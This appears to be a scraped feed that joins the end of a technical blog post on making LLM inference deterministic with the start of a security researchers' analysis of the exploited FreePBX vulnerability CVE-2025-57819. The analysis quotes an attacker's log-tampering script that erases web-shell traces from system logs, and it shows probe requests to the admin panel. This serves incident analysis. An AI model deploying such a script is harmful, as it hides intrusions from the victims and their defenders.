Although you can load all 100 elements in parallel, we must eventually reduce down to a single element. One way to accomplish this is with some kind of “atomic add” primitive, where the hardware guarantees that all additions will be processed but does not guarantee the order.&lt;/p&gt;&lt;p&gt;This is usually what folks mean by “nondeterminism” — you execute the same kernel twice with exactly the same inputs and you get a different result out. This is known as run-to-run nondeterminism, where you run the same python script twice with the exact same dependencies but get a different result.&lt;/p&gt;&lt;p&gt;Although concurrent atomic adds do make a kernel nondeterministic, atomic adds are not necessary for the vast majority of kernels. In fact, in the typical forward pass of an LLM, there is usually not a single atomic add present.&lt;/p&gt;&lt;p&gt;This may be surprising, given that parallelizing a reduction can benefit from atomic adds. There are two main reasons why atomic adds do not end up being needed.&lt;/p&gt;&lt;list rend="ol"&gt;&lt;item&gt;There is often sufficient parallelism along the “batch” dimension that we don’t need to parallelize along the reduction dimension. For example, let’s say that instead of reducing a single 100-dim vector we were reducing 500 vectors in parallel. In this case, we can reduce an entire vector in each core and allow every core to operate on a different vector.&lt;/item&gt;&lt;item&gt;Over time, most neural network libraries have adopted a variety of strategies for achieving determinism without sacrificing performance. For example, we can perform a “split” (or tree) reduction, where we split the 100-element reduction into five 20-element reductions (thus achieving five-way parallelism). Then, to combine the remaining five elements, we can either perform a separate “clean-up” reduction (which isn’t parallelized, but operates over few enough elements to be cheap) or utilize a semaphore (which ensures that each concurrent thread-block will accumulate in a deterministic order).The semaphore strategy can be found described here.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Due to these two factors, avoiding atomics adds is a negligible performance penalty for the vast majority of neural network operations.&lt;/p&gt;&lt;p&gt;There are still a couple of common operations that have significant performance penalties for avoiding atomics. For example, &lt;code&gt;scatter_add&lt;/code&gt; in PyTorch (&lt;code&gt;a[b] += c&lt;/code&gt;). The only one commonly used in LLMs, however, is FlashAttention backward.Fun fact: did you know that the widely used Triton implementations of FlashAttention backward actually differ algorithmically from Tri Dao’s FlashAttention-2 paper? The standard Triton implementation does additional recomputation in the backward pass, avoiding atomics but costing 40% more FLOPs!&lt;/p&gt;&lt;p&gt;However, the forward pass of an LLM involves no operations that require atomic adds. Thus, the forward pass in an LLM is in fact “run-to-run deterministic.”&lt;/p&gt;&lt;p&gt;Wikipedia writes that “a deterministic algorithm is an algorithm that, given a particular input, will always produce the same output.” And in this case, given the exact same inputs (i.e. the exact requests the inference server is processing), the forward pass always produces the exact same outputs.&lt;/p&gt;&lt;p&gt;However, the forward pass itself being “deterministic” is not sufficient to ensure that a system that includes it is deterministic. For example, what if our request’s output depended on the parallel user requests (e.g. batch-norm)? Since each individual request has no way of knowing what the parallel requests will be, from their perspective our overall LLM inference is also nondeterministic!&lt;/p&gt;&lt;p&gt;As it turns out, our request’s output does depend on the parallel user requests. Not because we’re somehow leaking information across batches — instead, it’s because our forward pass lacks “batch invariance”, causing our request’s output to depend on the batch size of our forward pass.&lt;/p&gt;&lt;head rend="h3"&gt;Batch Invariance and “Determinism”&lt;/head&gt;&lt;p&gt;To explain batch invariance, let’s simplify the system and look solely at matmuls. You can assume that all matmul implementations are “run-to-run deterministic."This is not totally true, but most common matmul implementations do have this property. However, they are not “batch-invariant.” In other words, when the batch size changes, each element in the batch can get different results.&lt;/p&gt;&lt;p&gt;This is a fairly unusual property from a mathematical perspective. Matrix multiplication should be “independent” along every element in the batch — neither the other elements in the batch nor how large the batch is should affect the computation results of a specific element in the batch.&lt;/p&gt;&lt;p&gt;However, as we can observe empirically, this isn’t true.&lt;/p&gt;&lt;code&gt;import torch
torch.set_default_device('cuda') 

B = 2048
D = 4096
a = torch.linspace(-1000, 1000, B*D).reshape(B, D)
b = torch.linspace(-1000, 1000, D*D).reshape(D, D)
# Doing a matrix vector multiplication by taking
# the first element of the batch
out1 = torch.mm(a[:1], b)
# Doing a matrix matrix multiplication and then taking
# the first element of the batch
out2 = torch.mm(a, b)[:1]
print((out1 - out2).abs().max()) # tensor(1669.2500, device='cuda:0')
&lt;/code&gt;&lt;p&gt;Note that this is “run-to-run deterministic.” If you run the script multiple times, it will deterministically return the same result.It is not “hardware/software version invariant” — your GPU/PyTorch version may return a different value, but it should deterministically return the same value.&lt;/p&gt;&lt;p&gt;However, when a non-batch-invariant kernel is used as part of a larger inference system, the system can become nondeterministic. When you make a query to an inference endpoint, the amount of load the server is under is effectively “nondeterministic” from the user’s perspective. The load determines the batch size that the kernels are run under, and thus changes the eventual result of each individual request!&lt;/p&gt;&lt;p&gt;If you compose some property under which the kernel is not invariant (i.e. batch-size) with nondeterminism of that property (i.e. the load the server is under), you get a nondeterministic system.&lt;/p&gt;&lt;p&gt;In other words, the primary reason nearly all LLM inference endpoints are nondeterministic is that the load (and thus batch-size) nondeterministically varies! This nondeterminism is not unique to GPUs — LLM inference endpoints served from CPUs or TPUs will also have this source of nondeterminism.&lt;/p&gt;&lt;p&gt;So, if we’d like to avoid nondeterminism in our inference servers, we must achieve batch invariance in our kernels. In order to understand how that can be achieved, let’s first take a look at why kernels don’t have batch invariance in the first place.&lt;/p&gt;&lt;head rend="h2"&gt;How do we make kernels batch-invariant?&lt;/head&gt;&lt;p&gt;In order to make a transformer implementation batch-invariant, we must make every kernel batch-invariant. Luckily, we can assume that every pointwise operation is batch-invariant.Although this is true for all kernels in say, PyTorch, it’s not inherently true. For example, there are some kernel implementations on CPU that will use vectorized intrinsics on some parts of the array and non-vectorized intrinsics on other parts, and these intrinsics don’t necessarily always have bitwise identical numerics. Thus, we only need to worry about the 3 operations that involve reductions — RMSNorm, matrix multiplication, and attention.Reductions related to parallelism are out of the scope of this discussion, but the same principles apply. One factoid that may be useful is that NVLink-Sharp in-switch reductions are deterministic on Blackwell as well as Hopper with CUDA 12.8+. As is the case with many things, this information can be found on NCCL’s github issues&lt;/p&gt;&lt;p&gt;Conveniently, these are also ordered in ascending levels of difficulty. Each one requires some additional considerations to achieve batch invariance with reasonable performance. Let’s talk about RMSNorm first.&lt;/p&gt;&lt;head rend="h3"&gt;Batch-Invariant RMSNorm&lt;/head&gt;RMSNorm can be implemented as:&lt;code&gt;# x: [batch_size, hidden_dim]
# weight: [hidden_dim]
def rms_norm(x, weight):
    return x * torch.rsqrt(torch.mean(x ** 2, dim=-1, keepdim=True)) * weight
&lt;/code&gt;&lt;p&gt;The requirement for batch invariance is that the reduction order for each element must be fixed regardless of the batch-size of the kernel. Note that this doesn’t mean we must always use the same reduction strategy. For example, if we change the number of elements we’re reducing over, we can still be batch-invariant even if our reduction strategy changes.The Quack blog post has some nice examples showing the hierarchy of various reduction strategies you can do (e.g. thread reduction, warp reduction, block reduction, cluster reduction).&lt;/p&gt;&lt;p&gt;Thus, we only break batch invariance when our batch-size affects the reduction strategy.&lt;/p&gt;&lt;p&gt;Let’s look at the standard parallelism strategy for RMSNorm. Generally, parallel algorithms benefit from minimizing communication across cores. For the purpose of this discussion you can assume that when we refer to “cores” we mean SMs. More specifically, the property here that’s important is that the # of threadblocks our kernel launches is greater than the # of SMs. So, one strategy we can start with is to assign each batch element to one core, as seen in the above figure.&lt;/p&gt;&lt;p&gt;Increasing our batch size doesn’t affect our reduction strategy; if a batch size of 200 provides sufficient parallelism to our kernel then a batch size of 2000 will definitely provide sufficient parallelism.&lt;/p&gt;&lt;p&gt;On the other hand, decreasing the batch size can pose challenges. Because we assign each batch element to one core, decreasing our batch size will eventually lead to having more cores than batch elements, leaving some cores idle.&lt;/p&gt;&lt;p&gt;Upon encountering this situation, a good kernel engineer would reach for one of the solutions mentioned in the prior section (atomic adds or split reductions), maintaining good parallelism and thus, good performance. Unfortunately, this changes the reduction strategy, preventing this kernel from being batch-invariant.&lt;/p&gt;&lt;p&gt;The easiest solution is to simply ignore these cases altogether. This is not completely unreasonable — a small batch size means that the kernel is likely to execute quickly anyways, and so a slowdown may not be catastrophic.&lt;/p&gt;&lt;p&gt;If we were compelled to optimize this use case, one approach would be to consistently use a reduction strategy that has enough parallelism even for very small batch sizes. Such a reduction strategy would lead to an excess amount of parallelism for larger batch sizes but would allow us to achieve decent (but not peak) performance across the entire range of sizes.&lt;/p&gt;&lt;head rend="h3"&gt;Batch-Invariant Matrix Multiplication&lt;/head&gt;&lt;p&gt;At its core, you can view matrix multiplication as simply a pointwise operation followed by a reduction. Then, if we parallelize our matrix multiplication by chunking the output into tiles, we have an analogous “data-parallel” kernel strategy that keeps each reduction within one core.&lt;/p&gt;&lt;p&gt;Also similar to RMSNorm, it is possible for our “batch” dimensions (M and N) to become too small, forcing us to split along the reduction dimension (K). Despite having two “batch” dimensions, matmuls also require us to have much more “work” per core in order to leverage tensorcores effectively. For example, if you have a [1024, K] x [K, 1024] matmul and a standard 2D tile size of [128, 128], a data-parallel strategy would only be able to split this matmul into 64 cores, insufficient to saturate the GPU.&lt;/p&gt;&lt;p&gt;Splitting along the reduction dimension in a matmul is known as a Split-K Matmul. And just like RMSNorm, using this strategy breaks batch invariance. Another interesting parallelism strategy for matmuls is stream-k. Stream-k is interesting because it has even less invariance than typical matmuls. As discussed, most matmul libraries are not batch-invariant, but they’re at least what you could call batch-position-invariant (i.e. changing the position of the element within the batch does not affect numerics). However, stream-k is not batch-position-invariant either! Its core insight is that you can get cleaner load-balancing by splitting along k in different ways for different output tiles, but taking advantage of this makes our kernel not batch-position-invariant either.&lt;/p&gt;&lt;p&gt;There’s an additional complexity with matmuls — tensor core instructions. Whereas with reductions we could simply operate on one row at a time, efficient matrix multiplication kernels must operate on an entire “tile” at a time.&lt;/p&gt;&lt;p&gt;Each tensor-core instruction (like say, &lt;code&gt;wgmma.mma_async.sync.aligned.m64n128k16&lt;/code&gt;) may have a different reduction order internally. One reason to use a different tensor-core instruction might be that the batch size is very small. For example, if we use a tensor-core PTX instruction that operates on a tile of length 256 but the batch size is only 32, we’re wasting almost all of that compute! At a batch-size of 1, the fastest kernels usually don’t use tensor cores at all.&lt;/p&gt;&lt;p&gt;So, the easiest way to ensure batch invariance for matmuls is to compile one kernel configuration and use that for all shapes. Although we will lose some performance, this isn’t typically disastrous in LLM inference. In particular, split-k is most needed when both M and N are small, and luckily in our case, N (i.e. the model dim) is usually pretty large!&lt;/p&gt;&lt;head rend="h3"&gt;Batch-Invariant Attention&lt;/head&gt;&lt;p&gt;After obtaining batch invariance for matmuls, attention introduces two additional wrinkles — fittingly, because it contains two matmuls.&lt;/p&gt;&lt;list rend="ol"&gt;&lt;item&gt;As opposed to only reducing over the feature dimension like both RMSNorm and matmuls, we now reduce over the feature dimension and sequence dimension.&lt;/item&gt;&lt;item&gt;Due to the above, attention must deal with a variety of inference optimizations that affect how sequences get processed (chunked prefill, prefix caching, etc.).&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Thus, to achieve determinism in LLM inference our numerics must be invariant to both how many requests are processed at once and how each request gets sliced up in the inference engine.&lt;/p&gt;&lt;p&gt;Let’s first walk through the standard parallelism strategy for attention, first introduced in FlashAttention2. Similar to RMSNorm and Matmul, the default strategy is a “data-parallel” strategy. Since we reduce along the key/value tensors, a data-parallel strategy can only parallelize along the query tensor.&lt;/p&gt;&lt;p&gt;For example, depending on the inference engine’s choices, it’s possible that a sequence might get processed in several parts (such as in chunked prefill) or perhaps all at once (if the prefill isn’t split up). In order to achieve “batch invariance”, it’s necessary that the reduction order for a given token does not depend on how many other tokens from its sequence are being simultaneously processed. If you reduce over the K/V values in the KV cache separately from the K/V values in the current tokens being processed (like in vLLM’s Triton attention kernel), this can’t be achieved. For example, when processing the 1000th query token in a sequence, the reduction order must be identical regardless of whether 0 tokens are in the KV cache (prefill) or 999 tokens are in the KV cache (decoding).&lt;/p&gt;&lt;p&gt;To resolve this, we can just update the KV cache and page table before the attention kernel itself, ensuring that our keys and values are always consistently laid out regardless of how many tokens are being processed.&lt;/p&gt;&lt;p&gt;With this additional detail (as well as all the things mentioned in the previous section, like consistent tile sizes), we are able to achieve a batch-invariant attention implementation!&lt;/p&gt;&lt;p&gt;However, there is a significant problem here. Unlike with matrix multiplication, the attention shapes we see in LLM inference often do require a split-reduction kernel, often known as Split-KV or FlashDecoding. This is because if we don’t parallelize along the reduction, we can only parallelize along the batch dimension, head dimension, and “query length” dimension. In the decode stage of attention, query length is very small, and so unless we have a very large batch size we are often unable to saturate the GPU.&lt;/p&gt;&lt;p&gt;Unfortunately, it’s not as easy to ignore this case as it was for RMSNorm and Matmuls. For example, if you have a very long KV cache, the attention kernel may take a very long time despite only processing one request.&lt;/p&gt;&lt;p&gt;Furthermore, the split-reduction strategies commonly used for attention also pose challenges for batch invariance. For example, FlashInfer’s “balanced scheduling algorithm” chooses the largest split-size that can still saturate all the GPU’s cores, thus making the reduction strategy not “batch-invariant”. However, unlike with RMSNorm/Matmuls, it’s not sufficient to choose a fixed number of splits regardless of the batch size.&lt;/p&gt;&lt;p&gt;Instead, to achieve batch invariance, we must adopt a “fixed split-size” strategy. In other words, instead of fixing the # of splits, we fix the size of each split and then end up with a varying number of splits. In this manner, we can guarantee that regardless of how many tokens we’re processing, we always perform the identical reduction order. This requires some internal FlexAttention changes that are not included in our code release. We will upstream them in the near future!&lt;/p&gt;&lt;head rend="h2"&gt;Implementation&lt;/head&gt;&lt;p&gt;We provide a demonstration of deterministic inference on top of vLLM by leveraging its FlexAttention backend as well as torch.Library. Through torch.Library, we’re able to substitute out most of the relevant PyTorch operators in an unintrusive way. You can find the library of “batch-invariant” kernels at thinking-machines-lab/batch-invariant-ops, as well as the vLLM example of running in “deterministic” mode.&lt;/p&gt;&lt;head rend="h2"&gt;Experiments&lt;/head&gt;&lt;head rend="h3"&gt;How nondeterministic are completions?&lt;/head&gt;&lt;p&gt;We use &lt;code&gt;Qwen/Qwen3-235B-A22B-Instruct-2507&lt;/code&gt; and sample 1000 completions at temperature 0 with the prompt “Tell me about Richard Feynman” (non-thinking mode), generating 1000 tokens each. Surprisingly, we generate 80 unique completions, with the most common of these occuring 78 times.&lt;/p&gt;&lt;p&gt;Looking at where the completions differ, we see that the completions are actually identical for the first 102 tokens! The first instance of diverging completions occurs at the 103rd token. All completions generate the sequence “Feynman was born on May 11, 1918, in” However, 992 of the completions go on to generate “Queens, New York” whereas 8 of the completions generate “New York City”.&lt;/p&gt;&lt;p&gt;On the other hand, when we enable our batch-invariant kernels, all of our 1000 completions are identical. This is what we would mathematically expect from our sampler, but we aren’t able to achieve deterministic results without our batch-invariant kernels.&lt;/p&gt;&lt;head rend="h3"&gt;Performance&lt;/head&gt;&lt;p&gt;We have not put a significant effort into optimizing the performance of the batch-invariant kernels here. However, let’s run some experiments to verify that our performance remains usable.&lt;/p&gt;&lt;p&gt;We will set up an API server with one GPU running Qwen-3-8B, and request 1000 sequences with an output length of between 90 and 110.&lt;/p&gt;&lt;table&gt;&lt;row span="2"&gt;&lt;cell role="head"&gt;Configuration&lt;/cell&gt;&lt;cell role="head"&gt;Time (seconds)&lt;/cell&gt;&lt;/row&gt;&lt;row span="2"&gt;&lt;cell&gt;vLLM default&lt;/cell&gt;&lt;cell&gt;26&lt;/cell&gt;&lt;/row&gt;&lt;row span="2"&gt;&lt;cell&gt;Unoptimized Deterministic vLLM&lt;/cell&gt;&lt;cell&gt;55&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;+ Improved Attention Kernel&lt;/cell&gt;&lt;cell&gt;42&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt;Much of the slowdown comes from the fact that the FlexAttention integration in vLLM has not been heavily optimized yet. Nevertheless, we see that performance is not disastrous.&lt;/p&gt;&lt;head rend="h3"&gt;True on-policy RL&lt;/head&gt;&lt;p&gt;As researchers have noted, the different numerics between training and inference implicitly turns our on-policy RL into off-policy RL.&lt;/p&gt;&lt;p&gt;Of course, it is impossible to get bitwise identical results between training and inference if we can’t even get bitwise identical results from two identical inference requests. Then, deterministic inference enables us to also modify our training stack to obtain bitwise identical results between sampling and training, thus resulting in true on-policy RL.&lt;/p&gt;&lt;p&gt;We run experiments in a RLVR setup on Bigmath with the RL policy initialized from the Qwen 2.5-VL instruct 8B with a max rollout length of 4096.&lt;/p&gt;&lt;p&gt;If we train without off-policy correction (i.e. importance weighting), our reward collapses partway through training, whereas adding an off-policy correction term allows training to proceed smoothly. But, if we achieve bitwise identical results between our sampler and trainer, we are fully on policy (i.e. 0 KL divergence) and can also train smoothly.&lt;/p&gt;&lt;p&gt;We can also plot the KL-divergence in logprobs between our sampler and trainer, where all 3 runs have notably different behavior. When running with importance weighting, it stays around 0.001 with occasional spikes. However, running without importance weighting eventually leads to a spike in KL-divergence around the same time that reward crashes. And, of course, when running “True On-Policy RL”, our KL-divergence stays flat at 0, indicating that there is no divergence between the training policy and sampling policy.&lt;/p&gt;&lt;head rend="h2"&gt;Conclusion&lt;/head&gt;&lt;p&gt;Modern software systems contain many layers of abstractions. In machine learning, when we run into nondeterminism and subtle numerical differences it can often be tempting to paper over them. After all, our systems are already “probabilistic”, so what’s wrong with a little more nondeterminism? What’s wrong with bumping up the atol/rtol on the failing unit test? The difference in logprobs between the trainer and the sampler probably isn’t a real bug, right?&lt;/p&gt;&lt;p&gt;We reject this defeatism. With a little bit of work, we can understand the root causes of our nondeterminism and even solve them! We hope that this blog post provides the community with a solid understanding of how to resolve nondeterminism in our inference systems and inspires others to obtain a full understanding of their systems.&lt;/p&gt;&lt;head rend="h2"&gt;Citation&lt;/head&gt;&lt;p&gt;Please cite this work as:&lt;/p&gt;&lt;code&gt;He, Horace and Thinking Machines Lab, "Defeating Nondeterminism in LLM Inference", 
Thinking Machines Lab: Connectionism, Sep 2025.
&lt;/code&gt;&lt;p&gt;Or use the BibTeX citation:&lt;/p&gt;&lt;code&gt;@article{he2025nondeterminism,
  author = {Horace He and Thinking Machines Lab},
  title = {Defeating Nondeterminism in LLM Inference},
  journal = {Thinking Machines Lab: Connectionism},
  year = {2025},
  note = {https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/},
  doi = {10.64434/tml.20250910}
}
&lt;/code&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/"/></entry><entry><id>https://news.ycombinator.com/item?id=45201372</id><title>Delphi 13 Florence Released</title><updated>2025-09-10T20:36:52.721365+00:00</updated><content/><link href="https://blogs.embarcadero.com/announcing-the-availability-of-rad-studio-13-florence/"/></entry><entry><id>https://news.ycombinator.com/item?id=45201474</id><title>Insufficiently sanitized data allows unauthenticated access to FreePBX Admin</title><updated>2025-09-10T20:36:52.304943+00:00</updated><content>&lt;doc fingerprint="8e06aa5899e587cc"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;You Already Have Our Personal Data, Take Our Phone Calls Too (FreePBX CVE-2025-57819)&lt;/head&gt;
    &lt;p&gt;We’re back - it’s a day, in a month, in a year - and once again, something has happened.&lt;/p&gt;
    &lt;p&gt;In this week’s episode of “the Internet is made of string and there is literally no evidence to suggest otherwise”, we present even further evidence that as a species we made a fairly painful mistake when we discovered electricity - and it just got worse and worse.&lt;/p&gt;
    &lt;p&gt;Today, inside this hellscape we call the Internet, a mean person has discovered a zero-day(s) in FreePBX (now lovingly called CVE-2025-57819). But they didn’t stop there - the dastardly individual(s) then proceeded to exploit FreePBX hosts en-masse.&lt;/p&gt;
    &lt;p&gt;As these stories sometimes play out, the ruse was rumbled when pesky sysadmins started posting to the FreePBX Community Forums, complaining of broken installs and other nonsense.&lt;/p&gt;
    &lt;p&gt;You decided to use FreePBX instead of Microsoft Teams, and now you have to live with the consequences.&lt;/p&gt;
    &lt;head rend="h3"&gt;Is This A FreePBX?&lt;/head&gt;
    &lt;p&gt;FreePBX is an open-source, web-based GUI that manages and controls the Asterisk VoIP phone system. Most of the code is wide open - you can spin up an appliance with a bash script or ISO and browse the PHP to your heart’s content. Some commercial add-on modules, though, are locked up behind ionCube Loader.&lt;/p&gt;
    &lt;p&gt;FreePBX isn’t just a toy project either - it’s used by everyone from home lab hobbyists to MSPs to full-blown enterprises.&lt;/p&gt;
    &lt;p&gt;As we’ve seen continuously - attackers love tapping communications. Earlier in 2025, the industry was overwhelmed with news about Salt Typhoon compromising telcos and lawful-interrcept systems at scale to intercept calls.&lt;/p&gt;
    &lt;p&gt;A compromise of FreePBX represents the same - access to phone calls, voicemails, recordings… (and the benefit of access to a privileged and likely trusted host in an interesting environment).&lt;/p&gt;
    &lt;head rend="h3"&gt;The Timeline Of Panic - It Begins&lt;/head&gt;
    &lt;p&gt;As always in life, everything interesting is ruined by someone asking questions.&lt;/p&gt;
    &lt;p&gt;On the 25th August 2025, someone did exactly that. The cheek!&lt;/p&gt;
    &lt;p&gt;Once we traversed their whining, the user did share some interesting information - they were seeing the following error when trying to access their FreePBX instance:&lt;/p&gt;
    &lt;code&gt;PHP Fatal error: Uncaught Error: Class “Symfony\\Component\\Console\\Application” not found in /var/www/html/admin/libraries/FWApplication.class.php:11
Stack trace:
#0 /var/lib/asterisk/bin/fwconsole(66): include()
#1 {main}
thrown in /var/www/html/admin/libraries/FWApplication.class.php on line 1
&lt;/code&gt;
    &lt;p&gt;While there is probably a joke here about this being what you might expect from a PHP application, things became interesting as other users began to chime in that they were also observing the same error on their appliance.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Timeline Of Panic - It Gets Worse&lt;/head&gt;
    &lt;p&gt;A further turn was taken when, a day later (August 26, 2025) a user shared the contents of &lt;code&gt;.clean.sh&lt;/code&gt;, a new file that had appeared on their phone call box that contained the following contents:&lt;/p&gt;
    &lt;code&gt;# cat .clean.sh
#!/bin/bash

LOGS=(
    "/var/log/asterisk/fail2ban"
    "/var/log/asterisk/freepbx_security.log"
    "/var/log/secure"
    "/var/log/httpd/error_log*"
    "/var/log/vsftpd.log"
    "/var/log/httpd/access_log*"
    "/var/log/apache2/access.log*"
    "/var/log/apache2/error.log*"
    "/var/log/openvpn.log"
    "/var/log/*"
)

for log in "${LOGS[@]}"; do
    find "$(dirname "$log")" -name "$(basename "$log")" -type f 2&amp;gt;/dev/null | while read -r file; do
        echo "Processing file: $file"
        sed -i --follow-symlinks             -e '/$SERVICE_NAME/d'             -e '/\\.cache/d'             -e '/\\modular\\.php/d'             -e '/\\monitor\\.php/d'             -e '/\\backend\\.php/d'             "$file"
    done
done

rm $0
&lt;/code&gt;
    &lt;p&gt;To quote an enlightened poster:&lt;/p&gt;
    &lt;quote&gt;I think we have a serious issue …&lt;/quote&gt;
    &lt;p&gt;That’s right, you do appear to have a serious issue, friend!&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;.clean.sh&lt;/code&gt; is pretty clearly a bash cleanup script designed to wipe evidence after backdoor access. It walks a bunch of log locations and scrubs references to common web shell paths and service names, then deletes itself. In other words, classic post-exploitation TTPs aimed at log tampering to hide web shell activity.&lt;/p&gt;
    &lt;p&gt;And it turns out this wasn’t a one-off. The same &lt;code&gt;.clean.sh&lt;/code&gt; script - along with assorted web shells - had been popping up across FreePBX installs, with evidence of activity going back to August 21, 2025.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Timeline Of Panic - It Gets Worserer&lt;/head&gt;
    &lt;p&gt;The takeaway from that community thread was clear - something nasty was brewing in the FreePBX world, almost certainly an unknown Remote Code Execution vulnerability.&lt;/p&gt;
    &lt;quote&gt;Editors note: Or, perhaps, just more intended functionality? ;-)&lt;/quote&gt;
    &lt;p&gt;What we’ve omitted to mention until this point is that we (watchTowr) have a little bit of experience working with FreePBX on security issues.&lt;/p&gt;
    &lt;p&gt;We reported a Post-Authenticated Command Injection vulnerability (CVE-2025-55211) to FreePBX in May 2025. Despite cruising past our 90-day disclosure window, it still hasn't been published.&lt;/p&gt;
    &lt;p&gt;The response we received? Well….&lt;/p&gt;
    &lt;p&gt;Your friendly informational post-auth RCE vulnerability - give us strength…..&lt;/p&gt;
    &lt;p&gt;Imagine our surprise when we saw panic quickly give way to action, with the FreePBX development team posting updates.&lt;/p&gt;
    &lt;p&gt;Their advice? Lock down access to the admin panel with IP whitelisting or firewall rules, and apply an out-of-band patch to one of the modules.&lt;/p&gt;
    &lt;code&gt;Additionally, there is now EDGE module fix for testing – please note that this has not gone through full normal QA, but we will be doing so ASAP and including as part of normal security release.

FreePBX users on v16 or v17 can run:

$ fwconsole ma downloadinstall endpoint --edge

PBXAct v16 users can run:

$ fwconsole ma downloadinstall endpoint --tag 16.0.88.19

PBXAct v17 users can run:

$ fwconsole ma downloadinstall endpoint --tag 17.0.2.31
&lt;/code&gt;
    &lt;p&gt;And associated vulnerability summary and description - giving us new clues. What is this Endpoint module and why must we once again be forced to reverse engineer cryptic clues about intended functionality?&lt;/p&gt;
    &lt;p&gt;Vulnerability Summary&lt;/p&gt;
    &lt;quote&gt;Insufficiently sanitized user-supplied data allows unauthenticated access to FreePBX Administrator leading to arbitrary database manipulation and remote code execution.&lt;/quote&gt;
    &lt;quote&gt;Starting on or before August 21st, 2025, an unauthorized user began accessing multiple FreePBX version 16 and 17 systems that were connected directly to the public internet -- systems with inadequate IP filtering/ACLs -- by exploiting a validation/sanitization error in the processing of user-supplied input to the commercial "endpoint" module. This initial entry point was then chained with several other steps to ultimately gain potentially root level access on the target systems.&lt;/quote&gt;
    &lt;head rend="h3"&gt;What Is The Endpoint Module?&lt;/head&gt;
    &lt;p&gt;Before we continue, let’s provide some very brief context on this Endpoint module for FreePBX. It is important to note that it is a commercial add-on.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Endpoint Manager module in FreePBX is a commercial add-on that simplifies provisioning and managing VoIP phones. It provides a centralized interface where administrators can configure templates, assign extensions, and push settings directly to supported devices without needing to manually edit configuration files or log into each phone.&lt;/item&gt;
      &lt;item&gt;The module supports a wide range of vendors, allows for bulk updates, and integrates with FreePBX’s extension management to streamline deployments and maintenance of SIP endpoints across an organization.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Time For Action&lt;/head&gt;
    &lt;p&gt;Getting bored of curating the most perfectest memes, we decided to once again rapidly dive in with our two-pronged approach:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Deploy, into Attacker Eye (our global sensor network), a fully-monitored (disk/memory/network) FreePBX sensor&lt;/item&gt;
      &lt;item&gt;Begin reverse engineering code changes&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;We Swear, It Fell Off A Truck&lt;/head&gt;
    &lt;p&gt;A quick patched vs unpatched comparison made one thing obvious: everything that changed lives inside the Endpoint module.&lt;/p&gt;
    &lt;p&gt;But, as always, we first need to understand how FreePBX actually functions given purposeful &lt;code&gt;.htaccess&lt;/code&gt; rules blocking direct access to the majority of files:&lt;/p&gt;
    &lt;code&gt;&amp;lt;IfModule mod_authz_core.c&amp;gt;
	# Disallow all . files, such as .htaccess or .git
	&amp;lt;FilesMatch "\\..*$"&amp;gt;
		Require all denied
	&amp;lt;/FilesMatch&amp;gt;
	# Allow index, config, and ajax.php, as well as all our image types.
	&amp;lt;FilesMatch "(^$|index\\.html|index\\.php|config\\.php|ajax\\.php|\\.(map|gif|GIF|jpg|jpeg|png|css|js|swf|txt|ico|ttf|svg|eot|woff|woff2|wav|mp3|aac|ogg|webm|gz|map)$)"&amp;gt;
		Require all granted
	&amp;lt;/FilesMatch&amp;gt;
&amp;lt;/IfModule&amp;gt;
&lt;/code&gt;
    &lt;p&gt;Using this &lt;code&gt;.htaccess&lt;/code&gt; rules above, we now know the FreePBX PHP endpoints within the main directory &lt;code&gt;/admin/&lt;/code&gt; that can be reached are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;/admin/ajax.php&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;/admin/config.php&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;They’re not exactly single-file scripts, and the call stacks go deep, so instead of making our lives difficult we decided to do what we do best - click around the UI to see how they behave in practice, hoping to really understand how FreePBX routes requests to modules.&lt;/p&gt;
    &lt;p&gt;Numerous requests appeared, primarily following the patterns listed below:&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?module=sms&amp;amp;command=getJSON&amp;amp;jdata=grid&amp;amp;search= HTTP/1.1
&lt;/code&gt;
    &lt;code&gt;GET /admin/config.php?display=sms
&lt;/code&gt;
    &lt;p&gt;We poked at &lt;code&gt;/admin/ajax.php&lt;/code&gt; to see if it was reachable without a session. Short answer: no.&lt;/p&gt;
    &lt;p&gt;For example, sending this request with no valid cookies…&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?module=endpoint&amp;amp;command=watchTowr HTTP/1.1
Host: {{Hostname}}
Referer: http://{{Hostname}}/admin/config.php
&lt;/code&gt;
    &lt;p&gt;Swiftly, an HTTP 401 response hits us in the face.&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 401 Unauthorized
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control, X-Auth-Token
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: $url
Access-Control-Max-Age: 86400
Allow: GET
Content-Length: 29
Content-Type: application/json

{"error":"Not Authenticated"}
&lt;/code&gt;
    &lt;p&gt;This is due to a code block in &lt;code&gt;admin/libraries/BMO/Ajax.class.php&lt;/code&gt; which checks for the presence of a valid session:&lt;/p&gt;
    &lt;code&gt;		// Check authentication if set to
		if ($this-&amp;gt;settings['authenticate']) {
			if (!isset($_SESSION['AMP_user'])) {
				$this-&amp;gt;ajaxError(401, 'Not Authenticated');
			} else {
				if (!defined('FREEPBX_IS_AUTH')) {
					define('FREEPBX_IS_AUTH', 'TRUE');
				}
			}
